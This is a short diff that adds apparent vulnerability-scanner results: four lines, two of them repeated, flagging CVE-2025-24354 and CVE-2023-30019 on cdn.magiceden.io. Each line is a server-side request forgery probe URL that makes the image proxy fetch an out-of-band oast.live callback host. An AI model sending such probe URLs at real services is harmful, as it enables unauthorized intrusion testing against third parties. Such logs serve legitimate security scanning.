@@ -1,0 +1,4 @@
+[CVE-2025-24354] [http] [medium] https://cdn.magiceden.io/unsafe/plain/http://d8st77romj13ejdjj7ugg5yxbadtqu989.oast.live
+[CVE-2025-24354] [http] [medium] https://cdn.magiceden.io/unsafe/plain/http://d8st77romj13ejdjj7ugg5yxbadtqu989.oast.live
+[CVE-2023-30019] [http] [medium] https://cdn.magiceden.io/111/rs:fit:400:400:0:0/plain/http://d8st77romj13ejdjj7ugakg5ro1ebfjqt.oast.live
+[CVE-2023-30019] [http] [medium] https://cdn.magiceden.io/111/rs:fit:400:400:0:0/plain/http://d8st77romj13ejdjj7ugakg5ro1ebfjqt.oast.live
